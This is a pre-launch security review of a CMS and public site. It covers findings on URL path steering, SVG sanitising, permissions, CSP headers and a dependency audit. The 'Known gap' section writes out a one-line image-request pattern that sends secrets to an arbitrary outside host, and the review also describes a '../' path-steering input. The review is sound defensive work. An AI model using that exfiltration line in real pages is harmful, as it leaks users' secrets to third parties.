# Security review — pre-launch

Whole-application pass over the public site and the CMS: the public form and suburb lookup, file
upload and SVG handling, the HTML purifier, authentication and sessions, the permission matrix,
mass assignment, and what the media route serves.

Reviewed at commit `01772f3`, on top of the search, notifications, enquiry and pagination work.

**Status:** findings **#1–#6 and #8 are fixed**. **#7 stands by design** — the media library is
public because it holds the site's images. Each finding says what was done underneath it.

A ninth issue was found afterwards and is the largest of them: **nothing set a single security
response header**. See *Response headers* below.

An OWASP Top 10 pass followed, category by category, in
`tests/Feature/Security/OwaspTest.php` — 31 tests. It is not a substitute for the per-feature
suites; it exists so a category nobody has thought about since cannot quietly stop being true.

---

## Findings

### 1. A visitor-supplied value is interpolated into an outbound Google URL — medium — **FIXED**

> `rawurlencode()` on the path segment. No validation regex: the repo holds no realistic Google
> place id to check a character class against, so a class asserted from memory could reject
> legitimate ids where encoding cannot. The cache key stays on the raw value, so nothing already
> cached was orphaned. Covered by
> `SuburbLookupTest::test_a_place_id_cannot_steer_the_request_to_another_endpoint`.


`app/Http/Controllers/SuburbLookupController.php:150` builds the request as
`self::DETAILS_URL.$placeId`, and `place_id` is validated only as `string|max:255`
(line 34). A value containing `../` walks back up the path, so a request can be steered to a
different endpoint on `places.googleapis.com` **with the site's API key attached**.

The host is fixed, so this is not full SSRF — the reachable surface is other Google Places
endpoints. But this is an unauthenticated public endpoint (throttled to 60/minute), and the key is
billable.

`rawurlencode($placeId)`, or a `regex:/^[A-Za-z0-9_-]+$/` rule, closes it.

### 2. Page revision restore is not behind `content.restore` — medium — **FIXED**

> `permit:content.restore` added to the route. This **removes a capability client administrators
> had**: they can no longer roll a page back to an earlier version. That is the §2 reading and it
> was chosen deliberately. Covered by
> `PermissionsTest::test_only_a_super_administrator_restores_an_earlier_version`.


`routes/web.php:61`. A client administrator can roll any page back to an earlier published version,
but the same account cannot unarchive a page (`routes/web.php:70`) and cannot delete anything. §2
puts restoring archived content with super administrators only, so the two sit either side of a line
that was meant to be one line.

Restoring a revision is arguably as consequential as unarchiving — it replaces the current draft.
Already carried in `docs/TODO.md` as an open permissions decision; this review agrees it is real.

### 3. SVG bytes are never inspected — medium — **FIXED**

> SVG uploads now go through `rhukster/dom-sanitizer` and the cleaned bytes are written back over
> the same key before the row exists, so the address never serves the original. Script elements,
> event-handler attributes and `javascript:` links are stripped; a foreign object, an external
> entity or anything that is not SVG comes back empty and is refused with a 422 and the object
> deleted. The super-administrator gate stays — this is a second lock, not a reason to widen who may
> upload one. The hardened response headers stay too.
>
> **On the library choice.** This review originally proposed `enshrined/svg-sanitize`, calling it
> MIT. It is **GPL-2.0-or-later**, which contradicts the decision recorded in `CLAUDE.md` that
> rejected CKEditor and TinyMCE for exactly that reason. `rhukster/dom-sanitizer` is MIT and needs
> only `ext-dom` and `ext-libxml`. The trade-off accepted knowingly: it has far less public scrutiny
> than the GPL package, so its behaviour was probed directly against hostile input before use rather
> than taken from its README — which does not document what it returns on failure. It returns an
> empty string, and throws outright on empty input.


`MediaController::store()` sets `$bytes = $extension === 'svg' ? null : …`, which skips the byte
sniff, the megapixel guard and the optimiser for SVGs entirely. Every other format is read and
rejected if the bytes disagree with the extension.

Two things hold the risk down: only a super administrator may upload one
(`media.upload_svg`, `sign()`), and `show()` serves every file with `X-Content-Type-Options: nosniff`
and `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`.

The exposure is that this safety lives **entirely in response headers**, so it depends on those
headers surviving whatever CDN or proxy ends up in front of the route. `docs/TODO.md` already states
the choice: parse the XML and reject scripts, or drop SVG support.

### 4. An enquiry is marked read by a GET — low — **FIXED**

> Reading one is now `POST /cms/enquiries/{enquiry}/read`, fired by the modal when an unread
> enquiry is actually put in front of somebody. The address still carries `?open=` so the bell can
> link to one and Back still closes it — the deep link stayed, the write moved off it.


`EnquiryController::index()` writes `read_at` when `?open={id}` is present. `SESSION_SAME_SITE` is
`lax`, so a cross-site sub-resource (an `<img>` tag) will not carry the session cookie — but a link
an administrator clicks will, and link prefetching by a browser or extension would too.

Impact is confined to the unread badge; no content changes and nothing is disclosed. Noted because
it is a state change on a safe method, which is worth knowing before anything else copies the
pattern.

### 5. `target="_blank"` is allowed without a forced `rel` — low — **FIXED**

> `HTML.TargetNoopener` enabled in the purifier config.


`app/Content/Html.php` sets `Attr.AllowedFrameTargets => ['_blank']` with `HTML.Nofollow => false`,
so an editor's link can open a new tab without `rel="noopener"`. Every current browser implies
`noopener` for `target="_blank"`, so this is close to historical. `HTML.TargetNoopener` would settle
it permanently.

### 6. Password policy is length only — low — **FIXED**

> `->uncompromised()` on both `Password::min(10)` rules. It fails open, so an unreachable breach
> service can never lock anybody out. **It makes a real HTTP call**, so `Tests\TestCase::setUp()`
> now fakes `api.pwnedpasswords.com/*` with an empty 200 — without it the suite would reach the
> internet to set a password and fail on any offline machine. The fake is scoped to that one host so
> a test's own `Http::fake()` still governs its own calls; `SuburbLookupTest` was checked
> specifically for that interaction.


`Password::min(10)` in `SaveUserRequest` and `UpdatePasswordRequest`. No breach check
(`->uncompromised()`), no complexity rule. With two administrator accounts and a 5-attempt
rate limit this is defensible; `->uncompromised()` is one call and would rule out the passwords that
actually get guessed.

### 7. Every media file is world-readable — low, by design

`/media/{key}` sits outside the authenticated group (`routes/web.php:162`). Upload keys are ULIDs
and unguessable; seeded keys (`2026/08/rachel.jpg`) are not. For a marketing site's images this is
the intent.

Worth stating plainly for whoever maintains it: **the media library is public**. Nothing
confidential should ever be uploaded to it, and the upload allowlist being images-only is what keeps
that true.

### 8. Deployment gates are documented but unticked — informational — **CHECKABLE**

> `php artisan security:check --production` now answers this list rather than leaving it in prose:
> debug off, an app key, HTTPS-only and same-site session cookies, an HTTPS site address. It reports
> rather than enforces — refusing to boot on a misconfiguration turns a warning into an outage — and
> it exits non-zero under `--production`, so a deploy step can gate on it.
>
> **The settings themselves are still yours to set on the day.** The command tells you whether you
> have. Right now, judged as production, this environment fails three of them, which is correct: it
> is a development machine.


- `SESSION_SECURE_COOKIE=true` once served over HTTPS (`config/session.php:172` defaults to unset).
- `APP_DEBUG=false` in production — `.env.example` ships `true`, correctly, for local.
- `SESSION_LIFETIME` chosen deliberately rather than left at 120 minutes.
- The Google Places key should be IP-restricted at the Google console, per `.env.example`.

None is a code defect. All four are things that have to be true on the day.

---

### 9. Nothing set a single security response header — high — **FIXED**

Found while working through OWASP A05. Every response left the application with no
`Content-Security-Policy`, no `X-Frame-Options`, no `X-Content-Type-Options`, no `Referrer-Policy`
and no `Permissions-Policy` — and announced its PHP version in `X-Powered-By`. The CMS could be
framed by any site on the internet, which is all clickjacking needs.

`app/Http/Middleware/SecurityHeaders.php` now sets them on every response, including the media route
and the sitemap.

The policy is **built per request**, for one reason worth understanding before changing it: the
Google analytics ids are content. An editor can turn tracking on from Settings with no deploy, so a
fixed policy would either permanently allow Google on a site that never calls it, or break tracking
the moment somebody switched it on. It allows exactly what the request in hand will use — and a test
pins both halves of that.

Two deliberate choices:

- **Inline scripts carry a nonce, not `'unsafe-inline'`.** `Vite::useCspNonce()` puts the same nonce
  on Vite's tags and the two tracking snippets ask for it by name.
- **`style-src` keeps `'unsafe-inline'`.** React sets element styles through the `style` prop, which
  is a style attribute, and the builder canvas is built the same way. Removing it would mean
  rewriting how every component is styled for no attacker benefit worth the change. Script execution
  is what a policy is really for.

`Strict-Transport-Security` is sent **only on secure requests** — over plain HTTP browsers ignore it
and it would pin a developer's machine to a scheme it is not serving.

Verified in a browser across the public site, an article, the CMS, the settings screen, the search
palette and the builder canvas — the last being the sharpest test, since it portals React into an
`about:blank` iframe. No violations on any screen that was visited.

**That sentence used to end "No violations anywhere", and it was wrong.** Every screen was walked; no
screen *did* anything. A media upload does not travel through PHP — the browser is handed a signed URL
and PUTs the bytes at storage itself, cross-origin — so `connect-src 'self'` blocked every upload, in
every environment, from the day this landed. The front end reported "Could not reach storage. Is it
running?" about a service that was running perfectly well, which is why it was read as an outage for
as long as it was. `e2e/cross/security.spec.js` walks 23 screens and never uploads, so it agreed.

The fix adds the storage origin to `connect-src` on `/cms/*` only, derived from
`filesystems.disks.s3.url` or `.endpoint` and stripped to a bare origin — a CSP source carrying
`/bucket` matches by path prefix. `script-src` is untouched, so the part of the policy that stops
script executing is exactly as it was; `connect-src` governs where already-running script may send
data. Three `OwaspTest` cases now pin it, one of them by signing a real upload and checking the policy
permits the host that signature points at — the two that only read the policy would both still pass if
the signed host moved. `e2e/sidebar/09-media.spec.js` performs a real upload and asserts each step.

**The upload test then immediately found a second one.** `uploadMedia.js` measured the picture before
recording it, by decoding the file from a `URL.createObjectURL` blob — and `img-src` does not permit
`blob:`, so the policy blocked that too. It failed invisibly: the probe has an `onerror` path that
resolves to nulls, and `store()` measures the stored bytes itself and overwrites whatever the request
carried, so a blocked measurement and a successful one produced the same row. The probe was removed
rather than `blob:` added to the policy — widening a security header to accommodate a value that is
discarded on arrival is the wrong trade, and `createObjectURL` appeared exactly once in the front end.
`MediaTest` now covers recording an upload whose request does not say how big it is.

The lesson for this document: a walkthrough covers the screens it visited, and saying "anywhere" of it
is how a gap gets recorded as a guarantee. Two defects hid behind that sentence, and the same test
found both within a minute of existing.

### Known gap: `img-src` permits any HTTPS host

Found while checking the above, and not introduced by it. `img-src` is `'self' data: https:`, so script
running on any page may set `new Image().src = 'https://somewhere-else/?' + secrets` and the policy will
allow it. As an exfiltration channel that is far wider than the single origin added to `connect-src`,
and tightening `connect-src` while leaving it open buys little.

Not fixed here, because it needs a decision rather than an edit: article bodies and section trees can
legitimately reference remote images, so narrowing this means either an allowlist of hosts or requiring
every image to be in the media library. Recorded so the next reader knows it was seen and weighed.

## What holds up

Recorded so a later reviewer knows it was checked, not skipped.

- **No raw SQL anywhere** except `app/Cms/Like.php:40`, which binds its pattern and takes its column
  list from caller constants, with the explicit `ESCAPE` clause SQLite needs.
- **Sign-in** rate limits on email + IP (5) *and* route (10/min), returns one generic failure for
  both wrong-email and wrong-password so accounts cannot be enumerated, regenerates the session, and
  refuses deactivated accounts.
- **Upload** is extension-allowlisted before a presigned URL is issued, then the bytes are sniffed on
  the way back and the object is deleted if they disagree with the name; a megapixel guard blocks
  decompression bombs.
- **Media serving** resolves the key against the database before touching the disk, so no path
  traversal reaches storage.
- **Article HTML** is purified on the way in against a tight allowlist with schemes limited to
  http/https/mailto/tel, which is what makes the single `dangerouslySetInnerHTML` in
  `Pages/Article.jsx:98` safe.
- **Section trees** run every string through `strip_tags` (`SaveSectionsRequest::sanitise`).
- **Mass assignment**: no model uses `$guarded = []`; no `env()` call outside `config/`.
- **The permission middleware** checks `is_active` as well as the ability, so disabling an account
  takes effect on the next request rather than the next login.
- **Deleting an enquiry** deliberately keeps the sender's name out of the audit log — erasing
  somebody while minting a permanent copy of their name would not be erasing them.
- **Pagination** takes its page size from an allowlist, so `?per_page=1000000` cannot be used to pull
  a whole table.

---

## Dependency audit — 9 August 2026

**All ten advisories are closed. Both audits now report clean.**

Only the two lockfiles changed — no constraint in `composer.json` or `package.json` moved, so
nothing about what this project asks for has changed, only which patch of it is installed.

| Package | From | To | Advisories closed |
|---|---|---|---|
| `guzzlehttp/guzzle` | 7.15.1 | 7.15.3 | 1 high, 1 medium |
| `guzzlehttp/promises` | 2.5.1 | 2.5.2 | — (carried by the above) |
| `league/commonmark` | 2.8.3 | 2.9.0 | 4 high, 2 medium |
| `nanoid` | 3.3.16 | 3.3.18 | 1 high |
| `postcss` | 8.5.22 | 8.5.26 | 1 moderate |

Verified afterwards: 609 tests pass, Pint clean, `npm run build` succeeds, and the public site, the
sign-in, the CMS and the suburb proxy were all exercised in a browser — the proxy specifically,
because every `Http::` call in the application goes through Guzzle.

### What the advisories were

| Package | Reached from |
|---|---|
| `guzzlehttp/guzzle` | `laravel/framework`, `aws/aws-sdk-php` |
| `league/commonmark` | `laravel/framework` |
| `nanoid`, `postcss` | Vite, build-time only |

Reachability, recorded so the severities are read in context rather than by their labels:

- **Guzzle is genuinely in use** — every `Http::` call goes through it, including the public suburb
  proxy. The high advisory (`CVE-2026-69246`, noncanonical host bypasses host-based checks) did not
  bite here, because the only outbound host is a constant. It was still the one that mattered most.
- **CommonMark is not called anywhere in this application.** Nothing in `app/` or the views uses
  `Str::markdown()` or Markdown mail; it arrives only as a Laravel dependency. Five of its six
  advisories are denial of service through crafted Markdown, which needs a path that parses
  attacker-supplied Markdown — there is none. Updated on principle rather than exposure.
- **`nanoid` and `postcss` never ship.** Both are transitive under Vite and run at build time only;
  nothing in the built bundle contains them. A high severity on a build tool is not a high severity
  on this website.

## Not covered

- No live testing against a deployed environment; this is a code review.
- Infrastructure: S3 bucket policy, CDN configuration and TLS are outside the repository.

## On the securityheaders.com grade

The six headers that grade counts are all set: `Content-Security-Policy`,
`Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` and
`Permissions-Policy`. `X-Powered-By` is removed, and `Cross-Origin-Opener-Policy` and
`X-Permitted-Cross-Domain-Policies` are set beyond the six.

**This has not been confirmed against the real scanner, and cannot be from here.** Two things are
only true once the site is live behind HTTPS:

1. **HSTS is sent only on secure requests.** Over `http://127.0.0.1` it is deliberately absent, so a
   scan of a local address would score lower than the deployed site.
2. The scanner needs a public URL. Run it after deploy, and re-run
   `php artisan security:check --production` at the same time — the two answer different questions.

## Worth repeating

A clean audit is a statement about today. Both files should be re-run before any release — and the
GPL/MIT slip recorded under finding #3 is the reminder that a licence, like a version, is a fact to
check rather than remember.
